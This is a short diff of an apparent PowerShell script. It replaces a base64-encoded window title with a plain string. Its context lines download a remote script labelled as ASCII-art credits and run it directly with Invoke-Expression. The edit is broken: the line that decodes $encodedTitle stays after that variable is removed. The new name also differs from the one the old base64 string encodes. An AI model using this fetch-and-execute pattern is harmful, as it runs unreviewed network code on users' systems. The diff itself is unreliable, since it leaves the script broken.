@@ -5,7 +5,7 @@ $asciiArtUrl = "https://raw.githubusercontent.com/suprsor/Credits/refs/heads/mai
 $asciiArtScript = Invoke-RestMethod -Uri $asciiArtUrl
 Invoke-Expression $asciiArtScript
 
-$encodedTitle = "TWFkZSBieSBAc3Vwc3ZvciBvbiBEaXNjb3Jk"
+$Host.UI.RawUI.WindowTitle = "Made by @suprsor on Discord"
 $titleText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedTitle))
 $Host.UI.RawUI.WindowTitle = $titleText
 
